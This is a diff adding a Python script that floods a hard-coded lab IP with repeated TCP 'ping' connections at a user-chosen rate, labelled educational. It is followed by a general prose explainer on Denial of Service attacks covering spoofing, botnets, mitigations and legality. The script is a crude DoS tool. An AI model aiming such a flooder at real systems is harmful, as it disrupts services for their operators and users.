@@ -1,0 +1,91 @@
+import socket
+import time
+
+def ping_server(host, port, num_pings):
+    # Calculate the sleep duration to distribute the pings across one second
+    sleep_duration = 1.0 / num_pings if num_pings > 0 else 0
+
+    while True:  # Start an infinite loop
+        for _ in range(num_pings):
+            start_time = time.time()
+
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                try:
+                    s.connect((host, port))
+                    # You can modify this message to be whatever you'd like
+                    message = "ping"
+                    s.sendall(message.encode())
+                    data = s.recv(1024)
+                    print(f"Received: {data.decode()}")
+                except Exception as e:
+                    print(f"An error occurred: {e}")
+
+            # Calculate the actual time taken to send a ping and adjust the sleep time
+            elapsed_time = time.time() - start_time
+            adjusted_sleep_duration = max(0, sleep_duration - elapsed_time)
+            time.sleep(adjusted_sleep_duration)
+        # This sleep ensures the loop runs once per second, adjust as needed
+        time.sleep(1 - num_pings * sleep_duration)
+
+# Replace '192.168.207.182' and 12345 with your server's IP and port
+HOST = '192.168.74.129'  
+PORT = 12345
+NUM_PINGS = int(input("Enter how many times to ping per second: "))
+
+ping_server(HOST, PORT, NUM_PINGS)
+
+# This code is being written by AV. Only use for Educational Purposes. Please don't misuse it. 
+
+
+
+Theory of Operation for a Denial of Service (DoS) Attack:
+
+1. **Target Selection**: The attacker selects a target system or network to disrupt. This could be a specific website, server, or network infrastructure.
+
+2. **Resource Exhaustion**: The attacker exploits vulnerabilities or overwhelms the target's resources to render it inaccessible to legitimate users. This can be achieved through various means:
+
+   - **Bandwidth Consumption**: Flooding the target with a high volume of traffic, saturating its network bandwidth and preventing legitimate requests from reaching their destination.
+   
+   - **Protocol Exploitation**: Exploiting weaknesses in network protocols (e.g., TCP/IP) to consume system resources or disrupt communication channels.
+   
+   - **Application Layer Attacks**: Targeting specific applications or services running on the target server by sending a high volume of malicious requests, exhausting server resources such as CPU, memory, or database connections.
+
+3. **Attack Execution**:
+   
+   - **Direct Attack**: The attacker may directly flood the target with traffic from their own infrastructure, leveraging botnets, or amplifying techniques to magnify the impact.
+   
+   - **Reflection/Amplification**: Utilizing third-party systems or misconfigured servers to reflect and amplify attack traffic towards the target, increasing its volume and potency.
+
+4. **Concealment Techniques**:
+   
+   - **IP Spoofing**: Falsifying the source IP address of attack packets to obscure the attacker's identity and location, making attribution challenging.
+   
+   - **Botnet Coordination**: Orchestrating a network of compromised devices (botnet) to distribute and amplify the attack traffic, complicating mitigation efforts.
+
+5. **Duration and Persistence**:
+   
+   - **Duration**: The attacker sustains the attack for an extended period, ranging from minutes to days, to maximize the disruption and impact on the target.
+   
+   - **Persistence**: Some attackers may launch intermittent or periodic attacks over an extended timeframe, testing the target's resilience and potentially causing prolonged downtime.
+
+6. **Mitigation and Countermeasures**:
+   
+   - **Traffic Filtering**: Implementing firewalls, intrusion prevention systems (IPS), or DDoS mitigation services to filter out malicious traffic and allow legitimate requests to reach the target.
+   
+   - **Rate Limiting**: Enforcing rate limits or request thresholds to prevent the rapid influx of requests from overwhelming the target's resources.
+   
+   - **Anomaly Detection**: Deploying anomaly detection mechanisms to identify and mitigate abnormal patterns of network traffic indicative of a DoS attack.
+   
+   - **Cloud-based Protection**: Leveraging cloud-based DDoS protection services to absorb and mitigate attack traffic before it reaches the target infrastructure.
+   
+   - **Collaborative Defense**: Sharing threat intelligence and collaborating with internet service providers (ISPs), industry partners, and law enforcement agencies to identify and neutralize attack sources.
+
+7. **Legal and Ethical Implications**:
+   
+   - **Legality**: DoS attacks are illegal in most jurisdictions and may result in criminal charges, fines, or imprisonment for perpetrators.
+   
+   - **Ethical Considerations**: Engaging in DoS attacks can have severe consequences for innocent bystanders and may violate ethical principles of integrity, confidentiality, and availability.
+
+Understanding the theory behind DoS attacks is crucial for developing effective defense strategies and mitigating their impact on critical infrastructure and digital services.
+
+
